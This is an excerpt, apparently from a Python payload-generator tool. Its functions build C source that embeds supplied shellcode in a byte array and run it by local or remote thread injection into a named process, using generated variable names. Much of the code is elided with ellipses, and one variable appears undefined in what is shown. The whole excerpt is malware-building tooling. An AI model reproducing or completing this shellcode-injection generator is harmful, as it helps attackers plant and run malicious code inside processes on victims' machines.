...
def LOCAL_OR_REMOTE(INJECTION_TYPE, PROCESSNAME, SHELLCODE):

    if INJECTION_TYPE == "local":
        VALUE_LOCAL_THREAD_INJECTION = LOCAL_THREAD_INJECTION(SHELLCODE)
        return VALUE_LOCAL_THREAD_INJECTION

    elif INJECTION_TYPE == "remote":

        if PROCESSNAME != "":
            VALUE_REMOTE_THREAD_INJECTION = REMOTE_THREAD_INJECTION(PROCESSNAME, SHELLCODE)
...
def LOCAL_THREAD_INJECTION(SHELLCODE):
    EXEC = core.VARNAME_CREATOR()

    VAR_LOCAL_THREAD_INJECTION = "unsigned char " + VAR_SHELLCODE + "[] = " + SHELLCODE + "\n"
...
def REMOTE_THREAD_INJECTION(PROCESSNAME, SHELLCODE):
    ...
    VAR_REMOTE_THREAD_INJECTION = "unsigned char " + VAR_SHELLCODE + "[] = " + SHELLCODE + "\n"
